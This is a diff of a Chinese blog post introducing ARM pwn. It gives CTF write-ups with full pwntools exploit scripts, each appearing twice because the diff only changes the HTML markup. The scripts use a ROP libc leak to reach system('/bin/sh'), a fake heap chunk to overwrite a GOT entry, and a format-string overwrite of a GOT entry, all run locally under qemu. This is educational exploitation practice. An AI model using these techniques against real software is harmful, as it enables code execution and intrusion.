+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chk</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1.65</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;How long do you want to take personal training?\n&#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./melong&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-arm -L ./  ./melong&#x27;</span>)</span><br><span class="line">    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-arm -L ./ -g 12345 ./melong&#x27;)</span></span><br><span class="line">    <span class="comment"># dbg(&#x27;b *0x01126C \n b *0x0010710&#x27;)</span></span><br><span class="line"></span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:000110BC                 BL      puts</span></span><br><span class="line"><span class="comment"># .text:000110C0                 NOP</span></span><br><span class="line"><span class="comment"># .text:000110C4                 POP     &#123;R11,PC&#125;</span></span><br><span class="line"><span class="comment"># .text:000110C4 ; End of function check_first</span></span><br><span class="line">    puts= <span class="number">0x000110BC</span></span><br><span class="line"></span><br><span class="line">    pr0 = <span class="number">0x00011bbc</span></span><br><span class="line">    pr3 = <span class="number">0x00010460</span></span><br><span class="line">    pr4 = <span class="number">0x000105e4</span></span><br><span class="line">    pr11= <span class="number">0x00011290</span> </span><br><span class="line"></span><br><span class="line">    chk()</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">84</span>) + p32(pr0) + p32(puts_got) + p32(puts) + p32(<span class="number">0</span>) + p32(main)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">    puts_addr = uu32(r32())</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">   </span><br><span class="line">    chk()</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">84</span>) + p32(pr0) + p32(bin_sh) + p32(system)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
@@ -746,21 +510,7 @@ io.interactive()</code></pre>
 <p>edit函数中存在off by null漏洞</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131528523.png" alt="image-20240713152844453"></p>
 <h2 id="本地交叉编译"><a href="#本地交叉编译" class="headerlink" title="本地交叉编译"></a><strong>本地交叉编译</strong><a id="loc"></a></h2><p>异架构对于堆来说有些不太友好，题目只给了一个libc文件，如果是x86系列，能直接从网上下载deb文件加压到libc同级的.debug文件夹下，设置debug-file-directory为.debug文件夹，调试时就能自动加载符号。但是arm架构不能如此，参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">winmt</a>本地自行编译：</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">tar -xvf ./glibc-2.27.tar.xz
-mkdir aarch64
-mkdir build
-cd build
-CC=/usr/bin/aarch64-linux-gnu-gcc \
-CXX=/usr/bin/aarch64-linux-gnu-g++ \
-CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \
-CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \
-../configure \
---prefix=/ctf/work/archs/arm64/2.27/glibc-2.27/aarch64 \
---host=aarch64-linux \
---target=aarch64-linux \
---disable-werror
-make
-make install</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf ./glibc-2.27.tar.xz</span><br><span class="line">mkdir aarch64</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">CC=/usr/bin/aarch64-linux-gnu-gcc \</span><br><span class="line">CXX=/usr/bin/aarch64-linux-gnu-g++ \</span><br><span class="line">CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; \</span><br><span class="line">CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; \</span><br><span class="line">../configure \</span><br><span class="line">--prefix=/ctf/work/archs/arm64/2.27/glibc-2.27/aarch64 \</span><br><span class="line">--host=aarch64-linux \</span><br><span class="line">--target=aarch64-linux \</span><br><span class="line">--disable-werror</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
 
 <p>然后在题目目录下：ln -s &#x2F;ctf&#x2F;work&#x2F;archs&#x2F;arm64&#x2F;2.27&#x2F;glibc-2.27&#x2F;aarch64&#x2F;lib .&#x2F;</p>
 <p>调试时能加载符号信息</p>
@@ -768,65 +518,7 @@ make install</code></pre>
 <p>可惜pwngdb里面的命令会报错 或是不正确反映，以后看看能不能搞搞这个（搁着先）</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142103556.png" alt="image-20240714210328489"></p>
 <p>创造一个fake chunk，然后任意写改free_got为system，退出执行free(‘&#x2F;bin&#x2F;sh’)</p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment"># coding = utf-8</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
-<span class="comment">#from ctypes import *</span>
-
-<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
-    sla(<span class="string">b&#x27;you choice: \n&#x27;</span>, <span class="built_in">str</span>(num))
-
-<span class="keyword">def</span> <span class="title function_">add0</span>(<span class="params">cx=<span class="string">b&#x27;a&#x27;</span>, cy=<span class="string">b&#x27;b&#x27;</span>, ori=<span class="number">0</span></span>):
-    menu(<span class="number">1</span>)
-    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)
-    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)
-    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))
-
-<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):
-    menu(<span class="number">2</span>)
-    sl(<span class="built_in">str</span>(idx))
-
-<span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx, content=<span class="string">b&#x27;&#x27;</span></span>):
-    menu(<span class="number">3</span>)
-    sl(<span class="built_in">str</span>(idx))
-    s(content)
-
-
-<span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">cx=<span class="string">b&#x27;c&#x27;</span>, cy=<span class="string">b&#x27;d&#x27;</span>, ori=<span class="number">0</span></span>):
-    menu(<span class="number">4</span>)
-    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)
-    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)
-    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))
-
-<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
-    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
-    context.arch = <span class="string">&#x27;aarch64&#x27;</span>
-    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span>
-    pwnfile = <span class="string">&#x27;./ememarm&#x27;</span>
-    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>
-    elf  = ELF(pwnfile)
-    libc = ELF(libc_name)
-
-    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-aarch64 -L ./ -g 12345 ./ememarm&#x27;)</span>
-    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ ./ememarm&#x27;</span>)
-    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *_start&#x27;, pwnfile)</span>
-    <span class="comment"># dbg("b *0x00400D40 ")</span>
-
-    sla(<span class="string">b&#x27;hello every one welcom my note  ~~4268144\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)
-
-    add0(<span class="string">b&#x27;aaaa&#x27;</span>, <span class="string">b&#x27;bbbb&#x27;</span>, <span class="number">0</span>)
-    add0(<span class="string">b&#x27;cccc&#x27;</span>, <span class="string">b&#x27;dddd&#x27;</span>, <span class="number">0</span>)
-    add0(<span class="string">b&#x27;eeee&#x27;</span>, <span class="string">b&#x27;ffff&#x27;</span>, <span class="number">1</span>)
-
-    add1(<span class="string">b&#x27;gggg&#x27;</span>, p64(<span class="number">0x31</span>), <span class="number">1</span>)
-    dele(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&#x27;deadbeef&#x27;</span>)
-    add1(<span class="string">b&#x27;hhhh&#x27;</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]), <span class="number">0</span>)
-
-    dele(<span class="number">2</span>, p64(<span class="number">0x4000831000</span> + libc.sym[<span class="string">&#x27;system&#x27;</span>]))
-    menu(<span class="number">5</span>)
-
-    itr()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;you choice: \n&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add0</span>(<span class="params">cx=<span class="string">b&#x27;a&#x27;</span>, cy=<span class="string">b&#x27;b&#x27;</span>, ori=<span class="number">0</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)</span><br><span class="line">    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)</span><br><span class="line">    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx, content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">cx=<span class="string">b&#x27;c&#x27;</span>, cy=<span class="string">b&#x27;d&#x27;</span>, ori=<span class="number">0</span></span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)</span><br><span class="line">    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)</span><br><span class="line">    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./ememarm&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-aarch64 -L ./ -g 12345 ./ememarm&#x27;)</span></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ ./ememarm&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *_start&#x27;, pwnfile)</span></span><br><span class="line">    <span class="comment"># dbg(&quot;b *0x00400D40 &quot;)</span></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;hello every one welcom my note  ~~4268144\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add0(<span class="string">b&#x27;aaaa&#x27;</span>, <span class="string">b&#x27;bbbb&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    add0(<span class="string">b&#x27;cccc&#x27;</span>, <span class="string">b&#x27;dddd&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    add0(<span class="string">b&#x27;eeee&#x27;</span>, <span class="string">b&#x27;ffff&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add1(<span class="string">b&#x27;gggg&#x27;</span>, p64(<span class="number">0x31</span>), <span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">    add1(<span class="string">b&#x27;hhhh&#x27;</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">2</span>, p64(<span class="number">0x4000831000</span> + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
@@ -842,31 +534,7 @@ make install</code></pre>
 </blockquote>
 <p>直接用一次性格式化字符串来改__stack_chk_fail_got为backdoor就行了</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141946475.png" alt="27275487-64e1-4985-9147-f9d421f1d03d"></p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment"># coding = utf-8</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
-<span class="comment">#from ctypes import *</span>
-
-<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
-    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
-    context.arch = <span class="string">&#x27;aarch64&#x27;</span>
-    IPort = <span class="string">&#x27;1 1&#x27;</span>
-    <span class="comment"># IPort = &#x27;127.0.0.1 12345&#x27;</span>
-    pwnfile = <span class="string">&#x27;./silent&#x27;</span>
-    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>
-    elf  = ELF(pwnfile)
-    libc = ELF(libc_name)
-
-    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ -g 12345 ./silent&#x27;</span>)
-    <span class="comment"># dbg("b *0x04007F4 \n b *0x000400854")</span>
-    <span class="comment"># dbg("b *0x000400854")</span>
-
-    scf = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]   <span class="comment">#14</span>
-    backdoor = <span class="number">0x00400770</span>
-    payload =  <span class="string">b&#x27;%1883c%c&#x27;</span> + <span class="string">b&#x27;%0c%0c%0c%0c%0c%0c%0c%c%c%c%c%c%c%c%c%c%c%caa%hn&#x27;</span>  + p64(scf)
-    sl(payload)
-    itr()
-<span class="comment">#canary   %19$p</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;1 1&#x27;</span></span><br><span class="line">    <span class="comment"># IPort = &#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./silent&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ -g 12345 ./silent&#x27;</span>)</span><br><span class="line">    <span class="comment"># dbg(&quot;b *0x04007F4 \n b *0x000400854&quot;)</span></span><br><span class="line">    <span class="comment"># dbg(&quot;b *0x000400854&quot;)</span></span><br><span class="line"></span><br><span class="line">    scf = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]   <span class="comment">#14</span></span><br><span class="line">    backdoor = <span class="number">0x00400770</span></span><br><span class="line">    payload =  <span class="string">b&#x27;%1883c%c&#x27;</span> + <span class="string">b&#x27;%0c%0c%0c%0c%0c%0c%0c%c%c%c%c%c%c%c%c%c%c%caa%hn&#x27;</span>  + p64(scf)</span><br><span class="line">    sl(payload)</span><br><span class="line">    itr()</span><br><span class="line"><span class="comment">#canary   %19$p</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -877,22 +545,151 @@ make install</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947663.png" alt="image-20240714194737601"></p>
 <p>可以发现从 x1开始打印，到x7，然后开始打印栈上的数据</p>
 <p>printf的源码有空再看咯，先贴一位师傅的博客<a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%8D%95%E6%AC%A1-printf-%E5%88%A9%E7%94%A8">格式化字符串漏洞利用 - WJH’s Blog (wjhwjhn.com)</a>，原理就在这里。</p>
-</main>
 
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://tw11ty.github.io/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/" data-id="cm1apfr7e000h0sjw0qo68ztp" data-title="arm-pwn入门" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/arm/" rel="tag">arm</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/07/15/WKCTF-pwn/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          WKCTF-pwn
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2024春秋杯夏季赛pwn</div>
+    </a>
+  
+</nav>
+
+  
 </article>
 
 
-<script src="/js/highlight.js"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    
 
-  </main>
-  <footer class="footer">
   
-  <span>Copyright © 2024 typo</span>
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO/" rel="tag">IO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arm/" rel="tag">arm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ciscn/" rel="tag">ciscn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-IO/" rel="tag">exit &amp; IO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmt/" rel="tag">fmt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writewp/" rel="tag">writewp</a></li></ul>
+    </div>
+  </div>
+
+
   
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/IO/" style="font-size: 10px;">IO</a> <a href="/tags/IOT/" style="font-size: 10px;">IOT</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/ciscn/" style="font-size: 10px;">ciscn</a> <a href="/tags/exit-IO/" style="font-size: 10px;">exit & IO</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/writewp/" style="font-size: 20px;">writewp</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">June 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/07/15/WKCTF-pwn/">WKCTF-pwn</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/">arm-pwn入门</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/">2024春秋杯夏季赛pwn</a>
+          </li>
+        
+          <li>
+            <a href="/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/">Iot-vulhub复现</a>
+          </li>
+        
+          <li>
+            <a href="/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/">2024ciscn分区赛-pwn复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 tw11ty<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
 </footer>
+
+    </div>
+    <nav id="mobile-nav">
   
-<script src="/js/theme.js"></script>
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
 
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
 </body>
-
 </html>
